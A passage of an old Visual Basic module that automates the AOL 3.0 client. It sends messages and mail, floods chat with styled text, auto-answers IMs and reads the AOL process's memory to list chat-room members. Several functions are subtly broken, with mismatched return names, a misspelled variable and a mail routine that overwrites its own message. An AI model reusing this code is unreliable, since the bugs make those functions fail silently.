mdi% = FindChildByClass(aol%, "MDIClient")
Call KeyWord("aol://9293:")
Do: DoEvents
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
aoedit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
aoicon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until aoedit% <> 0 And AORich% <> 0 And aoicon% <> 0
Call sendmessagebystring(aoedit%, WM_SETTEXT, 0, Recipiant)
Call sendmessagebystring(AORich%, WM_SETTEXT, 0, message)
For X = 1 To 9
    aoicon% = GetWindow(aoicon%, 2)
Next X
Call timeout(0.01)
ClickIcon (aoicon%)
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub

Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
trimspace$ = space$(GetTrim)
GetString = sendmessagebystring(child, 13, GetTrim + 1, trimspace$)
GetText = trimspace$
End Function

Function GetchatText()
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
ChatText = GetText(AORich%)
GetchatText = ChatText
End Function

Function LastChatLineWithSN()
ChatText$ = GetchatText

For FindChar = 1 To Len(ChatText$)

thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
LastLine = Mid(ChatText$, lastlen, Len(thechars$))

LastChatLineWithSN = LastLine
End Function

Function SNFromLastChatLine()
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For z = 1 To 11
    If Mid$(ChatTrim$, z, 1) = ":" Then
        SN = Left$(ChatTrim$, z - 1)
    End If
Next z
SNFromLastChatLine = SN
End Function

Function LastChatLine()
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub AddRoomToListBox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
thelist.Clear

room = FindChatRoom()
AOLHandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem Person$
Na:
Next index
Call CloseHandle(AOLProcessThread)
End If

End Sub

Sub AddRoomToComboBox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListBox(ListBox)
For Q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(Q))
Next Q
End Sub

Sub WavyChatBlueBlack(thetext)
G$ = thetext
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    t$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next W
SendChat (p$)
End Sub

Sub EliteTalker(word$)
Made$ = ""
For Q = 1 To Len(word$)
    Letter$ = ""
    Letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If Letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If Letter$ = "b" Then Leet$ = "b"
    If Letter$ = "c" Then Leet$ = "ç"
    If Letter$ = "d" Then Leet$ = "d"
    If Letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If Letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If Letter$ = "j" Then Leet$ = ",j"
    If Letter$ = "n" Then Leet$ = "ñ"
    If Letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If Letter$ = "s" Then Leet$ = "š"
    If Letter$ = "t" Then Leet$ = "†"
    If Letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If Letter$ = "w" Then Leet$ = "vv"
    If Letter$ = "y" Then Leet$ = "ÿ"
    If Letter$ = "0" Then Leet$ = "Ø"
    If Letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If Letter$ = "B" Then Leet$ = "ß"
    If Letter$ = "C" Then Leet$ = "Ç"
    If Letter$ = "D" Then Leet$ = "Ð"
    If Letter$ = "E" Then Leet$ = "Ë"
    If Letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If Letter$ = "N" Then Leet$ = "Ñ"
    If Letter$ = "O" Then Leet$ = "Õ"
    If Letter$ = "S" Then Leet$ = "Š"
    If Letter$ = "U" Then Leet$ = "Û"
    If Letter$ = "W" Then Leet$ = "VV"
    If Letter$ = "Y" Then Leet$ = "Ý"
    If Letter$ = "`" Then Leet$ = "´"
    If Letter$ = "!" Then Leet$ = "¡"
    If Letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = Letter$
    Made$ = Made$ & Leet$
Next Q
SendChat (Made$)
End Sub

Sub IMsOn()
Call IMKeyword("$IM_ON", "-ßðMß§qüãD ³·°² ")
End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", "-ßðMß§qüãD ³·°² ")
End Sub

'Sub MyASCII(PPP$)
'G$ = WavYChaT("Surge ")
'L$ = WavYChaT(" by JoLT")
'LO$ = WavYChaT(PPP$ & "Loaded")
'B$ = WavYChaT("User: " & UserSN)
'TI$ = CoLoRChaT(TrimTime)
'V$ = CoLoRChaT("v¹·¹")
'FONTTT$ = "<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">"
'SendChat (FONTTT$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & V$ & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & LO$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> •")
'Call timeout(0.15)
'SendChat (FONTTT$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & B$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> •" & TI$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
'End Sub

Function WavYChaTRedGreen(thetext As String)
G$ = thetext
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    t$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & t$
Next W
WavYChaTRG = p$
End Function
Function WavYChaTRedBlue(thetext As String)
G$ = thetext
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    t$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next W
WavYChaTRB = p$
End Function

Sub attention(thetext As String)
SendChat ("··×··ÃØdarcknight ÄTTÊÑTÎØÑ··×··")
Call timeout(0.15)
SendChat (thetext)
Call timeout(0.15)
SendChat ("··×··ÃØdarcknight ÄTTÊÑTÎØÑ··×··")
Call timeout(0.15)
End Sub

Sub KillGlyph()
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
Glyph% = FindChildByClass(aotool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub

Function CoLoRChaTBlueBlack(thetext As String)
G$ = thetext
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    t$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#00F" & Chr$(34) & ">" & R$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next W
CoLoRChaT = p$
End Function
Function ColorChatRedGreen(thetext)
G$ = thetext
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    t$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & R$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#006400" & Chr$(34) & ">" & t$
Next W
ColorChatRedGreen = p$

End Function
Function ColorChatRedBlue(thetext)
G$ = thetext
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    t$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & R$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & ">" & s$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & t$
Next W
ColorChatRedBlue = p$

End Function

Function TrimTime()
B$ = Left$(Time$, 5)
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(B$, 3) & " " & Ap$
End Function
Function TrimTime2()
B$ = Time$
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(B$, 5) & " " & Ap$
End Function

Function EliteText(word$)
Made$ = ""
For Q = 1 To Len(word$)
    Letter$ = ""
    Letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If Letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If Letter$ = "b" Then Leet$ = "b"
    If Letter$ = "c" Then Leet$ = "ç"
    If Letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If Letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If Letter$ = "j" Then Leet$ = ",j"
    If Letter$ = "n" Then Leet$ = "ñ"
    If Letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If Letter$ = "s" Then Leet$ = "š"
    If Letter$ = "t" Then Leet$ = "†"
    If Letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If Letter$ = "w" Then Leet$ = "vv"
    If Letter$ = "y" Then Leet$ = "ÿ"
    If Letter$ = "0" Then Leet$ = "Ø"
    If Letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If Letter$ = "B" Then Leet$ = "ß"
    If Letter$ = "C" Then Leet$ = "Ç"
    If Letter$ = "D" Then Leet$ = "Ð"
    If Letter$ = "E" Then Leet$ = "Ë"
    If Letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If Letter$ = "N" Then Leet$ = "Ñ"
    If Letter$ = "O" Then Leet$ = "Õ"
    If Letter$ = "S" Then Leet$ = "Š"
    If Letter$ = "U" Then Leet$ = "Û"
    If Letter$ = "W" Then Leet$ = "VV"
    If Letter$ = "Y" Then Leet$ = "Ý"
    If Len(Leet$) = 0 Then Leet$ = Letter$
    Made$ = Made$ & Leet$
Next Q

EliteText = Made$

End Function

'Sub MyName()
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>      :::               :::       ::::::::::: ")
'Call timeout(0.15)
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>      :::    :::::::    :::           :::")
'Call timeout(0.15)
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B>:::   :::   :::   :::   :::           :::")
'Call timeout(0.15)
'SendChat ("<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">" & "<B> :::::::     :::::::    :::::::::     :::")
'End Sub

Sub IMIgnore(thelist As ListBox)
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(mdi%, ">Instant Message From:")
If IM% <> 0 Then
    For FindSN = 0 To thelist.ListCount
        If LCase$(thelist.List(FindSN)) = LCase$(SNfromIM) Then
            BadIM% = IM%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next FindSN
End If
End Sub
Function SNfromIM()

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient") '

IM% = FindChildByTitle(mdi%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(mdi%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(IM%)
TheSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = TheSN$

End Function

Sub Playwav(file)
SoundName$ = file
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   X% = sndPlaySound(SoundName$, wFlags%)

End Sub

Sub KILLMODAL()
Modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_CLOSE, 0, 0)
End Sub

Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = FindChildByTitle(okw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function Wavy(thetext As String)

G$ = thetext
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    t$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<sup>" & R$ & "</sup>" & u$ & "<sub>" & s$ & "</sub>" & t$
Next W
Wavy = p$

End Function

Sub CenterForm(f As Form)
f.Top = (Screen.Height * 0.85) / 2 - f.Height / 2
f.Left = Screen.Width / 2 - f.Width / 2
End Sub
Sub IMAnswerMachine(message, IMRespondOn As Boolean, tmr As Timer)
'Put dis in a timer!
If IMRespondOn = True Then
tmr.Enabled = True
On Error Resume Next
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
TIT% = FindChildByTitle(mdi%, ">Instant Message From:")
tit2% = FindChildByTitle(mdi%, " Instant Message From:")
If TIT% <> 0 Then
TName$ = SNfromIM
closeit = SendMessage(TIT%, WM_CLOSE, 0, 0&)
Call InstantMessage2(TName$, message, 0.5)
ElseIf tit2% <> 0 Then
TName$ = SNfromIM
closeit = SendMessage(tit2%, WM_CLOSE, 0, 0&)
Call im2(TName$, message, 0.5)
End If
Else:
tmr.Enabled = False
End If
End Sub
Function im2(Who As String, What2Say As String, Delay As Integer)
Call IMKeyword(Who, What2Say)
X = FindWindow("AOL Frame25", vbNullString)
Y = FindChildByClass(X, "MDIClient")
z = FindChildByClass(Y, "#32770")
If z <> 0 Then
pause (Delay)
closeim = SendMessage(z, WM_CLOSE, 0, 0)
Else:
im2 = 0
End If
End Function

Function MessageFromIM()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")

IM% = FindChildByTitle(mdi%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(mdi%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
imtext% = FindChildByClass(IM%, "RICHCNTL")
IMmessage = GetText(imtext%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
Blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(Blah, Len(Blah) - 1)
End Function

Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub

Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For Findstring = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, Findstring)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For GetString = 0 To MenuItemCount% - 1
Subcount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, Subcount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = Subcount%
GoTo MatchString
End If

Next GetString

Next Findstring
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub

'Sub Surge()
'G$ = "<FONT FACE=" & Chr$(34) & "ARIAL" & Chr$(34) & ">"
'SendChat (G$ & "<B> ::::::::                                                          :::")
'Call timeout(0.15)
'SendChat (G$ & "<B> :::::::   :::  :::   : :::::    ::::::     ::::::                            " & Chr$(160) & " " & "    :::  :::  :::   :::  :::  :::  :::   :::···´")
'Call timeout(0.15)
'SendChat (G$ & "<B>::::::::    ::::: ::  :::        :::::::    ::::::                             " & Chr$(160) & " " & "                                   :::")
'Call timeout(0.15)
'SendChat (G$ & "<B>                                ::::::::")
'Call timeout(0.5)
'End Sub

Sub upchat()
aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(aol%, 1)
Call EnableWindow(Upp%, 0)
End Sub
Sub unupchat()
aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(aol%, 0)
End Sub

Sub HideAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(aol%, 0)
End Sub

Sub ShowAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(aol%, 5)
End Sub

Sub SendMail2(Recipiants, subject, message)
message = (Recipiants) + (Updates) + "Updates? - " + User
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")

aoicon% = GetWindow(aoicon%, 2)

ClickIcon (aoicon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
AOMail% = FindChildByTitle(mdi%, "Write Mail")
aoedit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
aoicon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And aoedit% <> 0 And AORich% <> 0 And aoicon% <> 0

Call sendmessagebystring(aoedit%, WM_SETTEXT, 0, Recipiants)

aoedit% = GetWindow(aoedit%, 2)
aoedit% = GetWindow(aoedit%, 2)
aoedit% = GetWindow(aoedit%, 2)
aoedit% = GetWindow(aoedit%, 2)
Call sendmessagebystring(aoedit%, WM_SETTEXT, 0, subject)
Call sendmessagebystring(AORich%, WM_SETTEXT, 0, message)

For GetIcon = 1 To 18
    aoicon% = GetWindow(aoicon%, 2)
Next GetIcon

ClickIcon (aoicon%)

Do: DoEvents
AOError% = FindChildByTitle(mdi%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
aoicon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (aoicon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
Function AOLVersion()
'returns What version the User is using
' this is for aol 3.0, ill try to make 1 for 4.0
aol% = FindWindow("AOL Frame25", vbNullString)
hMenu% = GetMenu(aol%)

SubMenu% = GetSubMenu(hMenu%, 0)
subitem% = GetMenuItemID(SubMenu%, 8)
MenuString$ = String$(100, " ")

Findstring% = GetMenuString(SubMenu%, subitem%, MenuString$, 100, 1)

If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
AOLVersion = 3
Else
AOLVersion = 2.5
End If
End Function
Sub AOLChatSend(Txt)
'sends "txt" to the chat room
room% = AOLFindRoom()
Call AOLSetText(FindChildByClass(room%, "_AOL_Edit"), Txt)
DoEvents
Call SendCharNum(FindChildByClass(room%, "_AOL_Edit"), 13)
End Sub
Function AOLFindRoom()
'sets focus on the chat room window
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "_AOL_Edit")
Listere% = FindChildByClass(childfocus%, "_AOL_View")
Listerb% = FindChildByClass(childfocus%, "_AOL_Listbox")

If listers% <> 0 And Listere% <> 0 And Listerb% <> 0 Then AOLFindRoom = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, GW_HWNDNEXT)
Wend
End Function
Sub AOLSetText(win, Txt)
'this will put "txt" in the window of "win"
'this can be used to change the text in _AOL_Static,
'RICHCNTL and _AOL_Edit windows or the Window caption
thetext% = sendmessagebystring(win, WM_SETTEXT, 0, Txt)
End Sub
Sub SendCharNum(win, chars)
e = SendMessageByNum(win, WM_CHAR, chars, 0)
End Sub

Sub CaptionScroll()
Do
Call ChangeCaptionByString(" America Online")
pause (0.1)
Call ChangeCaptionByString("  America Online")
pause (0.1)
Call ChangeCaptionByString("   America Online")
pause (0.1)
Call ChangeCaptionByString("    America Online")
pause (0.1)
Call ChangeCaptionByString("     America Online")
pause (0.1)
Call ChangeCaptionByString("      America Online")
pause (0.1)
Call ChangeCaptionByString("         America Online")
pause (0.1)
Call ChangeCaptionByString("           America Online")
pause (0.1)
Call ChangeCaptionByString("             America Online")
pause (0.1)
Call ChangeCaptionByString("               America Online")
pause (0.1)
Call ChangeCaptionByString("                 America Online")
pause (0.1)
Call ChangeCaptionByString("                  America Online")
pause (0.1)
Call ChangeCaptionByString("                    America Online")
pause (0.1)
Call ChangeCaptionByString("                      America Online")
pause (0.1)
Call ChangeCaptionByString("                        America Online")
pause (0.1)
Call ChangeCaptionByString("                          America Online")
pause (0.1)
Call ChangeCaptionByString("                            America Online")
pause (0.1)
Call ChangeCaptionByString("                              America Online")
pause (0.1)
Call ChangeCaptionByString("                                America Online")
pause (0.1)
Call ChangeCaptionByString("                                  America Online")
pause (0.1)
Call ChangeCaptionByString("                                     America Online")
pause (0.1)
Call ChangeCaptionByString("                                        America Online")
pause (0.1)
Call ChangeCaptionByString("                                           America Online")
pause (0.1)
Call ChangeCaptionByString("                                             America Online")
pause (0.1)
Call ChangeCaptionByString("                                                America Online")
pause (0.1)
Call ChangeCaptionByString("                                                    America Online")
pause (0.1)
Call ChangeCaptionByString("                                                        America Online")
pause (0.1)
Call ChangeCaptionByString("                                                            America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                    America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                        America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                            America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                                America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                                    America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                                        America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                                            America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                                                America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                                                     America Online")
pause (0.1)
Call ChangeCaptionByString("                                                                                                         America Online")
pause (0.1)
Call ChangeCaptionByString(" By")
pause (0.1)
Call ChangeCaptionByString("  By")
pause (0.1)
Call ChangeCaptionByString("   By")
pause (0.1)
Call ChangeCaptionByString("    By")
pause (0.1)
Call ChangeCaptionByString("     By")
pause (0.1)
Call ChangeCaptionByString("       By")
pause (0.1)
Call ChangeCaptionByString("         By")
pause (0.1)
Call ChangeCaptionByString("           By")
pause (0.1)
Call ChangeCaptionByString("             By")
pause (0.1)
Call ChangeCaptionByString("               By")
pause (0.1)
Call ChangeCaptionByString("                 By")
pause (0.1)
Call ChangeCaptionByString("                  By")
pause (0.1)
Call ChangeCaptionByString("                    By")
pause (0.1)
Call ChangeCaptionByString("                      By")
pause (0.1)
Call ChangeCaptionByString("                        By")
pause (0.1)
Call ChangeCaptionByString("                          By")
pause (0.1)
Call ChangeCaptionByString("                            By")
pause (0.1)
Call ChangeCaptionByString("                              By")
pause (0.1)
Call ChangeCaptionByString("                                By")
pause (0.1)
Call ChangeCaptionByString("                                  By")
pause (0.1)
Call ChangeCaptionByString("                                     By")
pause (0.1)
Call ChangeCaptionByString("                                        By")
pause (0.1)
Call ChangeCaptionByString("                                           By")
pause (0.1)
Call ChangeCaptionByString("                                             By")
pause (0.1)
Call ChangeCaptionByString("                                               By")
pause (0.1)
